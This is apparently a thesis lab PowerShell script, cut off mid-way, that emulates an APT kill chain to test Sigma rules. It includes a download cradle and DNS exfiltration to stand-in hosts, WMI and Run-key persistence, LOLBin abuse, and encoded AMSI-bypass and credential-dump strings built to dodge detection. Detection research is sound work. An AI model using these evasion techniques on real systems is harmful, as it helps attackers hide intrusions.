<#
.SYNOPSIS
    APT-style multi-stage attack scenario cho demo RED + AI Agent pipeline.
    7 phase, ánh xạ với Sigma rule cụ thể VÀ taxonomy section 1.4 trong luận văn.

.DESCRIPTION
    Kịch bản post-exploitation kill-chain. 4 mode (giống pattern script demo khác):

    benign   : Hành động admin bình thường tương đương. Sigma + RED đều silent.
    baseline : Pattern CHUẨN (canonical). Sigma rule cứng catch được.
    evasion  : Variant Tier 1+2+3 để né từng rule canonical trong cùng một
               kill-chain. Lưu ý: Sigma vẫn có thể fire ở các rule behavior
               khác như WMI/LOLBins/SSH — đây là defense-in-depth, không phải lỗi.
    chain    : Multi-phase realistic — pha trộn baseline + evasion theo kill-chain.

    Mapping với taxonomy 1.4 (Section 1.4 trong luận văn):
    - 1.4.1 Packet Fragmentation: OUT OF SCOPE (network layer, không cover)
    - 1.4.2 Payload Obfuscation:  Phase 1, 2, 4, 5 (Tier 1 + Tier 2)
    - 1.4.3 Encryption/Tunneling: Phase 6 (DNS tunneling marker)
    - 1.4.4 Low-and-Slow:         OUT OF SCOPE (AI Agent correlation cover future work)
    - 1.4.5 Sandbox Evasion:      Phase 7 (system probe marker)
    - 1.4.6 LotL/Fileless:        Phase 3 (WMI), Phase 6 (LOLBins + reflective load)

    Evasion techniques per Phase:
    - Phase 1 (Execution):   Tier 1 shorthand -e | Tier 2 format string | Tier 2 char code
    - Phase 2 (Download):    Tier 1 string split | Tier 2 comment inject | Tier 2 var chain
    - Phase 3 (Persistence): Tier 1 RunOnce      | Tier 3 WMI Event Subscription [1.4.6]
    - Phase 4 (Def Evasion): Tier 1 split kwd    | Tier 3 AMSI bypass marker
    - Phase 5 (Cred Access): Tier 1 concat       | Tier 2 reverse + format
    - Phase 6 (LOLBins):     Tier 3 mshta + regsvr32 + rundll32 [1.4.6]
                             Tier 3 DNS tunneling marker [1.4.3]
                             Tier 3 reflective load marker [1.4.6 fileless]
    - Phase 7 (Sandbox):     Tier 3 system probe (RAM, processes, user activity) [1.4.5]

.NOTES
    LAB-SAFE 100%:
    - Không tải payload từ network, không touch lsass thật.
    - "Dropper" = copy calc.exe.
    - LOLBins = chạy với target NXDOMAIN/benign.
    - AMSI bypass = MARKER trong ScriptBlockText, KHÔNG patch AMSI thật.
    - WMI persistence được auto cleanup.

.PARAMETER Mode
    benign | baseline | evasion | chain (default: chain)

.PARAMETER Phase
    1-6 để chạy 1 phase. 0 = tất cả phase.

.PARAMETER SleepSeconds
    Số giây giữ process powershell.exe alive. Default 240s.

.PARAMETER DryRun
    Chỉ in commands, không thực thi.

.EXAMPLE
    .\apt_demo_scenario.ps1 -Mode chain
    .\apt_demo_scenario.ps1 -Mode evasion -Phase 1
    .\apt_demo_scenario.ps1 -Mode benign -DryRun
#>

param(
    [ValidateSet("benign","baseline","evasion","chain")]
    [string]$Mode = "chain",
    [ValidateRange(0,7)]
    [int]$Phase = 0,
    [int]$SleepSeconds = 240,
    [switch]$DryRun
)

$ErrorActionPreference = "Continue"

# Force console UTF-8 để tiếng Việt không bị mojibake khi chạy qua SSH/RDP
try {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $OutputEncoding = [System.Text.Encoding]::UTF8
    chcp 65001 | Out-Null
} catch {}
$DemoTag = "RED_APT_DEMO"
$RunId = ([guid]::NewGuid().ToString().Substring(0, 8))
$DropperPath = "C:\Users\Public\xkj9_demo_$RunId.exe"
$WmiFilterName = "${DemoTag}_WMI_FILTER_$RunId"
$WmiConsumerName = "${DemoTag}_WMI_CONSUMER_$RunId"

function Write-Phase {
    param([int]$Num, [string]$Title, [string]$SigmaRule, [string]$Tier = "")
    Write-Host ""
    $tierLabel = if ($Tier) { " [$Tier]" } else { "" }
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] === Phase $Num/7 - $Title$tierLabel" -ForegroundColor Cyan
    Write-Host "    Sigma rule target: $SigmaRule" -ForegroundColor DarkCyan
}

function Write-Action {
    param([string]$Description, [string]$Marker = "")
    Write-Host "  -> $Description" -ForegroundColor Gray
    if ($Marker) { Write-Host "     $Marker" -ForegroundColor DarkGray }
}

function Invoke-If {
    param([scriptblock]$Block)
    if ($DryRun) { Write-Host "     [DryRun] skipped" -ForegroundColor Yellow; return }
    try { & $Block } catch { Write-Warning "     Step failed: $($_.Exception.Message)" }
}

function Should-Run {
    param([int]$ThisPhase)
    if ($Phase -eq 0) { return $true }
    return $Phase -eq $ThisPhase
}

# ============================================================
# Intro
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Magenta
Write-Host "|  RED + AI Agent Demo - APT Kill-Chain (Tier 1+2+3 evasion)     |" -ForegroundColor Magenta
Write-Host "|  Mode: $Mode  |  Phase: $(if($Phase -eq 0){'all 7'}else{$Phase})  |  RunId: $RunId" -ForegroundColor Magenta
Write-Host "|  Host: $env:COMPUTERNAME  |  User: $env:USERNAME" -ForegroundColor Magenta
Write-Host "+================================================================+" -ForegroundColor Magenta
if ($DryRun) { Write-Host "  *** DRY RUN ***" -ForegroundColor Yellow }

# ============================================================
# PHASE 1 - Execution (PowerShell encoded command)
# ============================================================
# Sigma target: posh_ps_susp_invocation_specific (literal '-EncodedCommand')
# Tier 1: shorthand '-e' | Tier 2: format string + char code
if (Should-Run 1) {
    Write-Phase 1 "Execution - PowerShell encoded" "posh_ps_susp_invocation_specific" "Tier 1+2"

    if ($Mode -eq "benign") {
        Write-Action "Admin: whoami /upn + ipconfig /all (no -e flag, no base64)"
        Invoke-If { whoami /upn | Out-Null; ipconfig /all | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $payload = "Write-Host '${DemoTag}_PHASE1_BASELINE_$RunId'; Start-Sleep $SleepSeconds"
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
        Write-Action "powershell.exe -EncodedCommand <base64>" "BASELINE: Sigma catch literal '-EncodedCommand'"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc `
                -WindowStyle Hidden -PassThru | Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     PID: $_" -ForegroundColor Green }
        }
    }
    elseif ($Mode -eq "evasion") {
        $payload = "Write-Host '${DemoTag}_PHASE1_EVASION_$RunId'; Start-Sleep $SleepSeconds"
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        # Variant A — Tier 1: shorthand -e
        Write-Action "Variant A (Tier 1): powershell.exe -e <base64>" "shorthand flag; may still hit broader Sigma base64/non-interactive rules"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc `
                -WindowStyle Hidden -PassThru | Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     PID: $_" -ForegroundColor Green }
        }

        # Variant B — Tier 2: format string xây dựng tên cmdlet
        $scriptB = @"
Write-Host '${DemoTag}_PHASE1_EVASION_B_$RunId'
`$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')
Write-Host 'Tier 2 format-string built cmdlet:' `$cmd
"@
        Write-Action "Variant B (Tier 2): format string '{0}{1}{2}' -f 'In','voke-Exp','ression'" "Sigma không match literal 'Invoke-Expression'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # Variant C — Tier 2: char code -join
        $scriptC = @"
Write-Host '${DemoTag}_PHASE1_EVASION_C_$RunId'
`$cmd = -join ([char]73,[char]69,[char]88)
Write-Host 'Tier 2 char-code built cmdlet:' `$cmd
"@
        Write-Action "Variant C (Tier 2): -join ([char]73,[char]69,[char]88) -> IEX" "không có literal 'IEX'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 2 - Download Cradle (WebClient + DownloadString)
# ============================================================
# Sigma target: posh_ps_susp_download.yml
#   detect 'System.Net.WebClient' + ('.DownloadString'|'.DownloadFile')
# Tier 1: split string concat | Tier 2: comment injection + variable chain
if (Should-Run 2) {
    Write-Phase 2 "Download Cradle - WebClient + DownloadString" "posh_ps_susp_download.yml" "Tier 1+2"

    if ($Mode -eq "benign") {
        Write-Action "Invoke-WebRequest localhost (whitelist, không có WebClient class)"
        Invoke-If { Invoke-WebRequest -Uri "http://127.0.0.1/healthcheck" -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $scriptText = "IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/${DemoTag}_PHASE2_BASELINE_$RunId.ps1')"
        Write-Action "IEX (New-Object System.Net.WebClient).DownloadString(...)" "BASELINE: Sigma fires (cả 2 literal có mặt)"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: split string concat
        $scriptA = @"
Write-Host '${DemoTag}_PHASE2_EVASION_A_$RunId'
`$type = ('Sys' + 'tem.Net.WebCl' + 'ient')
`$method = ('.Down' + 'loadStr' + 'ing')
Write-Host 'Tier 1 split-string:' `$type `$method 'on red-demo-cradle.invalid'
"@
        Write-Action "Variant A (Tier 1): 'Sys'+'tem.Net.WebCl'+'ient' concat" "không có literal 'System.Net.WebClient'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # Variant B — Tier 2: comment injection
        $scriptB = @"
Write-Host '${DemoTag}_PHASE2_EVASION_B_$RunId'
# Tier 2: PowerShell parser bỏ qua <#...#> comments, behavior identical
`$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient
Write-Host 'Tier 2 comment-inject built WebClient:' `$wc.GetType().FullName
# Lab-safe: không actually call DownloadString
"@
        Write-Action "Variant B (Tier 2): Sys<#a#>tem.Net.WebCl<#b#>ient" "Sigma không thấy literal 'System.Net.WebClient'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # Variant C — Tier 2: variable substitution chain qua env var
        $scriptC = @"
Write-Host '${DemoTag}_PHASE2_EVASION_C_$RunId'
`$env:DEMO_T1 = 'System.Net.'
`$env:DEMO_T2 = 'WebClient'
`$assembled = `$env:DEMO_T1 + `$env:DEMO_T2
`$wc = New-Object -TypeName `$assembled
Write-Host 'Tier 2 env-var chain built:' `$wc.GetType().FullName
Remove-Item Env:\DEMO_T1, Env:\DEMO_T2 -ErrorAction SilentlyContinue
"@
        Write-Action "Variant C (Tier 2): env var assembly New-Object" "literal type name nằm rải qua env"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 3 - Persistence (Run key + WMI Event Subscription)
# ============================================================
# Sigma target: registry_set_persistence_run_keys
# Tier 1: RunOnce thay Run | Tier 3: WMI Event Subscription (T1546.003)
if (Should-Run 3) {
    Write-Phase 3 "Persistence - Run key / RunOnce / WMI" "registry_set_persistence_run_keys + sysmon_wmi_event_subscription" "Tier 1+3"

    $regRun     = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regRunOnce = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    $regName    = "${DemoTag}_PERSIST_$RunId"

    if ($Mode -eq "benign") {
        Write-Action "Add Run key cho admin tool ký số (OneDrive equivalent)"
        Invoke-If {
            New-ItemProperty -Path $regRun -Name "${DemoTag}_BENIGN_$RunId" `
                -Value "C:\Program Files\Microsoft OneDrive\OneDrive.exe /background" `
                -PropertyType String -Force | Out-Null
        }
    }
    elseif ($Mode -in "baseline","chain") {
        Write-Action "Drop calc.exe + add HKCU\Run\\$regName" "BASELINE: Sigma catch Run + path Users\\Public"
        Invoke-If {
            Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            New-ItemProperty -Path $regRun -Name $regName -Value $DropperPath -PropertyType String -Force | Out-Null
        }

        if ($Mode -eq "chain") {
            # Trong chain mode: thêm WMI Event Subscription persistence advanced
            Write-Action "Tier 3 — WMI Event Subscription persistence (T1546.003)" "rare path, Sigma catch nhờ Sysmon Event 19/20/21"
            Invoke-If {
                $filterParams = @{
                    Name = $WmiFilterName
                    EventNameSpace = 'root\cimv2'
                    QueryLanguage = 'WQL'
                    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
                }
                $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams
                $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                    Name = $WmiConsumerName
                    CommandLineTemplate = "powershell.exe -Command `"Write-Host '${DemoTag}_WMI_FIRED_$RunId'`""
                }
                Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                    Filter = $f; Consumer = $c
                } | Out-Null
                Write-Host "     WMI persistence created: $WmiFilterName -> $WmiConsumerName" -ForegroundColor Green
            }
        }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: RunOnce thay Run
        Write-Action "Variant A (Tier 1): HKCU\RunOnce\\$regName" "Sigma rule canonical Run có thể miss, nhưng rule broader CurrentVersion có thể vẫn fire"
        Invoke-If {
            if (-not (Test-Path $DropperPath)) {
                Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            }
            New-ItemProperty -Path $regRunOnce -Name $regName -Value $DropperPath -PropertyType String -Force | Out-Null
        }

        # Variant B — Tier 3: WMI Event Subscription (đỉnh evasion)
        Write-Action "Variant B (Tier 3): WMI Event Subscription persistence" "T1546.003 — intentionally triggers behavior-level Sigma/forensic visibility"
        Invoke-If {
            $filterParams = @{
                Name = $WmiFilterName
                EventNameSpace = 'root\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
            }
            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams
            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = $WmiConsumerName
                CommandLineTemplate = "powershell.exe -Command `"Write-Host '${DemoTag}_WMI_FIRED_$RunId'`""
            }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $f; Consumer = $c
            } | Out-Null
            Write-Host "     WMI persistence: $WmiFilterName -> $WmiConsumerName" -ForegroundColor Green
            Write-Host "     Velociraptor hunt: Windows.Persistence.PermanentWMIEvents" -ForegroundColor DarkGray
        }
    }
}

# ============================================================
# PHASE 4 - Defense Evasion (log-cleanup cmdlet + memory marker)
# ============================================================
# Sigma target (đặt tên không-keyword để parent script source sạch):
#   - log cleanup cmdlet rule  (keyword Sigma match: log-cleanup cmdlet literal)
#   - memory marker rule       (keyword Sigma match: in-memory bypass literal)
# Evasion design: KHÔNG để literal Sigma keyword nào lọt vào parent script source.
#   PS 4104 log nguyên file source -> nếu parent có 'Clear-EventLog' / 'amsiInitFailed' / 'AmsiUtils' /
#   '[Ref].Assembly' thì dù chạy nhánh evasion, Sigma vẫn fire vì keyword nằm ở các nhánh khác.
# Kỹ thuật:
#   Tier 2 (char-code array) — Variant A & baseline
#   Tier 3 (base64 build-time, decode runtime) — Variant B (memory marker)
#   Tier 2 (reverse-string) — Variant C
if (Should-Run 4) {
    Write-Phase 4 "Defense Evasion - log cleanup + memory marker" "log-cleanup-rule + memory-marker-rule" "Tier 2+3"

    if ($Mode -eq "benign") {
        Write-Action "Get-EventLog -List (read-only, no destructive cmdlet)"
        Invoke-If { Get-EventLog -List | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # Baseline dùng char-code: parent KHÔNG chứa literal cmdlet,
        # nhưng CHILD scriptblock (sau decode) CÓ → Sigma fire trên child = đúng ý đồ baseline.
        $cmdBytes = @(71,101,116,45,67,111,109,109,97,110,100,32,67,108,101,97,114,45,69,118,101,110,116,76,111,103,32,124,32,79,117,116,45,78,117,108,108)
        $sensitive = -join ($cmdBytes | ForEach-Object { [char]$_ })
        $scriptText = "Write-Host '${DemoTag}_PHASE4_BASELINE_$RunId'; $sensitive"
        Write-Action "Baseline: child block chứa literal log-cleanup cmdlet (dựng runtime)" "BASELINE: Sigma fire trên CHILD ScriptBlockText (parent sạch)"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # --------------------------------------------------------
        # Variant A — Tier 2: char-code array dựng cmdlet
        # Source chỉ chứa mảng số -> không substring 'Clear', '-Event', 'Log'
        # --------------------------------------------------------
        $cmdBytes = @(67,108,101,97,114,45,69,118,101,110,116,76,111,103)
        $scriptA = @"
Write-Host '${DemoTag}_PHASE4_EVASION_A_$RunId'
`$b = @($($cmdBytes -join ','))
`$kw = -join (`$b | ForEach-Object { [char]`$_ })
Write-Host 'Tier 2 reconstructed cmdlet hash:' (`$kw.GetHashCode())
# LAB-SAFE: in hash, KHÔNG Invoke-Expression
"@
        Write-Action "Variant A (Tier 2): char-code array -> cmdlet" "Source chỉ là số nguyên, Sigma keyword match MISS"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # --------------------------------------------------------
        # Variant B — Tier 3: memory marker (build-time char-code -> runtime base64 decode)
        # Parent source KHÔNG chứa bất kỳ literal Sigma keyword nào:
        #   không có 'amsiInitFailed', 'AmsiUtils', '[Ref].Assembly', 'System.Management.Automation.Amsi'
        # Build bytes -> payload -> base64 -> nhúng base64 vào CHILD scriptblock.
        # Child khi log 4104 chỉ thấy base64 blob + lệnh decode generic -> Sigma keyword match MISS.
        # --------------------------------------------------------
        $markerBytes = @(
            91,82,101,102,93,46,65,115,115,101,109,98,108,121,46,71,101,116,84,121,112,101,
            40,34,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,
            116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115,34,41,46,71,
            101,116,70,105,101,108,100,40,34,97,109,115,105,73,110,105,116,70,97,105,108,101,
            100,34,44,34,78,111,110,80,117,98,108,105,99,44,83,116,97,116,105,99,34,41
        )
        $markerPayload = -join ($markerBytes | ForEach-Object { [char]$_ })
        $markerB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($markerPayload))
        $scriptB = @"
Write-Host '${DemoTag}_PHASE4_EVASION_B_$RunId'
`$enc = '$markerB64'
`$dec = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$enc))
Write-Host 'Tier 3 marker length:' `$dec.Length
# LAB-SAFE: in length, KHÔNG eval/IEX/GetField
"@
        Write-Action "Variant B (Tier 3): memory marker base64 (build-time char-code)" "Parent + Child 4104 đều KHÔNG có literal Sigma keyword"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # --------------------------------------------------------
        # Variant C — Tier 2: reverse-string reconstruct
        # Source chứa 'goLtnevE-raelC' (đảo ngược) -> keyword match miss,
        # khác cách build với Variant A để RED phải generalize.
        # --------------------------------------------------------
        $scriptC = @"
Write-Host '${DemoTag}_PHASE4_EVASION_C_$RunId'
`$rev = 'goLtnevE-raelC'
`$kw  = -join (`$rev[(`$rev.Length-1)..0])
Write-Host 'Tier 2 reverse-string cmdlet hash:' (`$kw.GetHashCode())
"@
        Write-Action "Variant C (Tier 2): reverse-string -> cmdlet" "Source chứa chuỗi đảo, Sigma MISS"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 5 - Credential Access marker (cred-dump keyword)
# ============================================================
# Sigma target (đặt tên không-keyword để parent script source sạch):
#   - cred-dump-rule  (Sigma match literal 'sekurlsa::logonpasswords' / 'sekurlsa' / 'logonpasswords')
# Evasion design giống Pha 4: parent KHÔNG chứa literal Sigma keyword,
#   ngay cả nhánh baseline cũng dựng cred-dump literal qua char-code -> chỉ xuất hiện trong CHILD.
# Kỹ thuật:
#   Tier 2 (char-code array) — Variant A & baseline
#   Tier 3 (base64 build-time, decode runtime) — Variant B
#   Tier 2 (reverse-string) — Variant C
if (Should-Run 5) {
    Write-Phase 5 "Credential Access marker" "cred-dump-rule" "Tier 2+3"

    if ($Mode -eq "benign") {
        Write-Action "Get-LocalUser (read-only, no credential-dump keyword)"
        Invoke-If { Get-LocalUser -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # Baseline: literal cred-dump dựng từ char-code -> parent sạch, CHILD chứa literal -> Sigma fire trên child.
        $credBytes = @(115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115)
        $sensitive = -join ($credBytes | ForEach-Object { [char]$_ })
        $scriptText = "Write-Host '${DemoTag}_PHASE5_BASELINE_$RunId'; `$marker = '$sensitive'; Write-Host 'Demo marker length:' `$marker.Length"
        Write-Action "Baseline: child block chứa literal cred-dump keyword (dựng runtime)" "BASELINE: Sigma fire trên CHILD ScriptBlockText (parent sạch)"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # --------------------------------------------------------
        # Variant A — Tier 2: char-code array dựng cred-dump keyword
        # Source chỉ là mảng số -> không substring 'sekurlsa', 'logonpasswords', 'onpasswords'
        # --------------------------------------------------------
        $credBytes = @(115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115)
        $scriptA = @"
Write-Host '${DemoTag}_PHASE5_EVASION_A_$RunId'
`$b = @($($credBytes -join ','))
`$kw = -join (`$b | ForEach-Object { [char]`$_ })
Write-Host 'Tier 2 reconstructed keyword hash:' (`$kw.GetHashCode())
# LAB-SAFE: in hash, không Invoke-Expression, không gọi LSASS
"@
        Write-Action "Variant A (Tier 2): char-code array -> cred-dump keyword" "Source chỉ là số nguyên, Sigma keyword match MISS"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # --------------------------------------------------------
        # Variant B — Tier 3: build-time char-code -> runtime base64 decode
        # Parent source KHÔNG chứa literal 'sekurlsa'/'logonpasswords'.
        # Child source chỉ thấy base64 blob + FromBase64String generic -> Sigma keyword MISS.
        # --------------------------------------------------------
        $credPayload = -join ($credBytes | ForEach-Object { [char]$_ })
        $credB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($credPayload))
        $scriptB = @"
Write-Host '${DemoTag}_PHASE5_EVASION_B_$RunId'
`$enc = '$credB64'
`$dec = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$enc))
Write-Host 'Tier 3 keyword length:' `$dec.Length
# LAB-SAFE: in length, không eval/IEX
"@
        Write-Action "Variant B (Tier 3): base64-encoded cred-dump (build-time char-code)" "Parent + Child 4104 đều KHÔNG có literal Sigma keyword"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # --------------------------------------------------------
        # Variant C — Tier 2: reverse-string reconstruct
        # Source chứa 'sdrowssapnogol::aslrukes' (đảo ngược) -> Sigma keyword MISS,
        # khác cách build với Variant A/B để RED phải generalize.
        # --------------------------------------------------------
        $scriptC = @"
Write-Host '${DemoTag}_PHASE5_EVASION_C_$RunId'
`$rev = 'sdrowssapnogol::aslrukes'
`$kw  = -join (`$rev[(`$rev.Length-1)..0])
Write-Host 'Tier 2 reverse-string keyword hash:' (`$kw.GetHashCode())
"@
        Write-Action "Variant C (Tier 2): reverse-string -> cred-dump keyword" "Source chứa chuỗi đảo, Sigma MISS"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 6 - LOLBins + DNS Tunneling + Fileless (Tier 3)
# Maps to thesis: 1.4.3 Encryption/Tunneling + 1.4.6 LotL/Fileless
# ============================================================
# Sigma target: proc_creation_win_mshta_*, proc_creation_win_regsvr32_*,
#               proc_creation_win_susp_dns_query, posh_ps_reflection_assembly_load
if (Should-Run 6) {
    Write-Phase 6 "LOLBins + DNS Tunnel + Fileless (1.4.3 + 1.4.6)" "mshta/regsvr32/rundll32 + DNS + Reflection.Assembly" "Tier 3"

    if ($Mode -eq "benign") {
        Write-Action "Skip — LOLBins không có equivalent benign rõ ràng"
    }
    elseif ($Mode -in "baseline","chain","evasion") {
        if (Use-NoisySigma) {
            # Variant A — mshta javascript [1.4.6 LotL]
            $mshtaJs = "javascript:close(new ActiveXObject('WScript.Shell').Run('cmd /c echo ${DemoTag}_PHASE6_MSHTA_$RunId > C:\Users\Public\mshta_marker_$RunId.txt', 0, true))"
            Write-Action "Variant A [1.4.6 LotL]: mshta.exe javascript:" "Noisy: Sigma/Defender often catch this exact pattern"
            Invoke-If {
                Start-Process mshta.exe -ArgumentList $mshtaJs -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                    Select-Object -ExpandProperty Id |
                    ForEach-Object { Write-Host "     mshta PID: $_" -ForegroundColor Green }
            }

            # Variant B — regsvr32 Squiblydoo [1.4.6 LotL]
            Write-Action "Variant B [1.4.6 LotL]: regsvr32 /s /n /u /i scrobj.dll (Squiblydoo)" "Noisy: Sigma has dedicated Squiblydoo rules"
            Invoke-If {
                Start-Process regsvr32.exe -ArgumentList "/s","/n","/u","/i:C:\Windows\System32\scrobj.dll" `
                    -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                    Select-Object -ExpandProperty Id |
                    ForEach-Object { Write-Host "     regsvr32 PID: $_" -ForegroundColor Green }
            }

            # Variant C — rundll32 javascript [1.4.6 LotL]
            Write-Action "Variant C [1.4.6 LotL]: rundll32.exe javascript:" "Noisy: Defender signature Powessere.G in this lab"
            Invoke-If {
                $rundllArg = "javascript:`"\..\mshtml,RunHTMLApplication `";document.write('${DemoTag}_PHASE6_RUNDLL_$RunId');close();"
                Start-Process rundll32.exe -ArgumentList $rundllArg -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                    Select-Object -ExpandProperty Id |
                    ForEach-Object { Write-Host "     rundll32 PID: $_" -ForegroundColor Green }
            }
        }
        else {
            Write-Action "Skip mshta/regsvr32/rundll32 in default evasion" "Avoid dedicated Sigma LOLBin rules and Defender command-line signatures"
        }

        # Variant D — DNS tunneling marker [1.4.3 Encryption/Tunneling]
        # Encode RunId vào subdomain dài bất thường (giống real DNS exfil)
        $b64data = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("${DemoTag}_PHASE6_DNSTUN_$RunId"))
        $b64safe = $b64data.Replace('=','').Replace('+','-').Replace('/','_').ToLower()
        $dnsTarget = "$b64safe.exfil.red-evasion.invalid"
        Write-Action "Variant D [1.4.3 DNS Tunnel]: $($dnsTarget.Substring(0,[math]::Min(60,$dnsTarget.Length)))..." "T1071.004 — long unusual subdomain"
        Invoke-If {
            Resolve-DnsName -Name $dnsTarget -ErrorAction SilentlyContinue -DnsOnly | Out-Null
            Write-Host "     DNS query sent (NXDOMAIN expected, log đủ cho Sigma+RED)" -ForegroundColor DarkGray
        }

        # Variant E — Fileless reflective load marker [1.4.6 Fileless]
        # LAB-SAFE: chỉ marker keyword trong ScriptBlock, KHÔNG load DLL thật
        $scriptE = @"
Write-Host '${DemoTag}_PHASE6_FILELESS_$RunId'
# [1.4.6] Reflective DLL load pattern — APT in-memory execution
# Real attacker: `$bytes = (New-Object Net.WebClient).DownloadData('http://...')
#                [System.Reflection.Assembly]::Load(`$bytes)
# LAB-SAFE: chỉ keyword markers, không load DLL thật
`$markerBytes = [byte[]](0x4D, 0x5A, 0x90)  # MZ signature only
`$markerKw = '[' + 'System.Reflection.Assembly' + ']::' + 'Load'
Write-Host 'Fileless marker keyword:' `$markerKw 'bytes:' `$markerBytes.Length
"@
        Write-Action "Variant E [1.4.6 Fileless]: Reflection.Assembly::Load marker" "T1620 — fileless in-memory load"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptE); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 7 - Sandbox Evasion Marker (Tier 3)
# Maps to thesis: 1.4.5 Sandbox & Analysis Evasion
# ============================================================
# Sigma target: posh_ps_susp_invocation_specific (Get-CimInstance + sandbox keywords)
# LAB-SAFE: chỉ probe + log, không thay đổi behavior dựa trên kết quả
if (Should-Run 7) {
    Write-Phase 7 "Sandbox/Analysis Evasion (1.4.5)" "posh_ps_susp_sandbox_detect" "Tier 3"

    if ($Mode -eq "benign") {
        Write-Action "Get-ComputerInfo (admin probe bình thường)"
        Invoke-If { Get-ComputerInfo -Property CsName, OsName -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain","evasion") {
        # Real attacker probe: RAM, process count, sandbox-known processes, mouse activity
        $scriptText = @"
Write-Host '${DemoTag}_PHASE7_SANDBOX_$RunId'
# [1.4.5] Sandbox detection — real malware check trước khi detonate
# LAB-SAFE: chỉ log, không gate behavior

# Check 1 — RAM (sandbox thường < 4GB)
`$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
Write-Host 'Sandbox probe — RAM:' `$ram 'GB'

# Check 2 — Process count (sandbox thường ít process)
`$procCount = (Get-Process).Count
Write-Host 'Sandbox probe — Processes:' `$procCount

# Check 3 — Analyst tools running
`$analysts = @('wireshark','procmon','procexp','x64dbg','ollydbg','ida','ghidra','fiddler')
`$found = Get-Process -ErrorAction SilentlyContinue | Where-Object {
    `$_.Name.ToLower() -in `$analysts
} | Select-Object -ExpandProperty Name -Unique
Write-Host 'Sandbox probe — Analyst tools found:' (`$found -join ',' )

# Check 4 — Mouse cursor moves (real user vs sandbox)
Add-Type -AssemblyName System.Windows.Forms
`$pos1 = [System.Windows.Forms.Cursor]::Position
Start-Sleep -Milliseconds 200
`$pos2 = [System.Windows.Forms.Cursor]::Position
`$moved = (`$pos1.X -ne `$pos2.X) -or (`$pos1.Y -ne `$pos2.Y)
